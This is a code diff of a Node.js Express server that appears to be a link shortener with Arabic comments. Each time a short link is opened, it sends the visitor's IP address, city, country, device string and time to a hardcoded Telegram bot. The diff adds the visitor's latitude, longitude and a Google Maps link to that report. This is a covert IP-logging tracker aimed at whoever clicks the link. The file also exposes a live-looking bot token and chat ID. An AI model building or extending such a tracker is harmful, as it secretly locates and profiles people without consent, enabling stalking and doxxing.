@@ -9,7 +9,7 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static('.')); // ← تغيير هنا
+app.use(express.static('.'));
 
 const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
 const TELEGRAM_CHAT_ID = '5942654805';
@@ -22,6 +22,12 @@ function generateShortCode() {
 
 async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
   const geo = geoip.lookup(ip);
+  
+  // إحداثيات الموقع
+  const lat = geo?.ll?.[0] || 'N/A';
+  const lng = geo?.ll?.[1] || 'N/A';
+  const mapsUrl = lat !== 'N/A' ? `https://maps.google.com/?q=${lat},${lng}` : 'N/A';
+  
   const message = `
 🔗 رابط جديد تم فتحه!
 ━━━━━━━━━━━━━━
@@ -30,6 +36,9 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
 🔌 IP Address: ${ip}
 📍 الدولة: ${geo?.country || 'غير معروف'}
 🏙️ المدينة: ${geo?.city || 'غير معروف'}
+📊 خط الطول: ${lng}
+📊 دائرة العرض: ${lat}
+🗺️ الموقع على الخريطة: ${mapsUrl}
 🖥️ Device: ${userAgent.substring(0, 60)}
 ⏰ الوقت: ${new Date().toISOString()}
   `.trim();
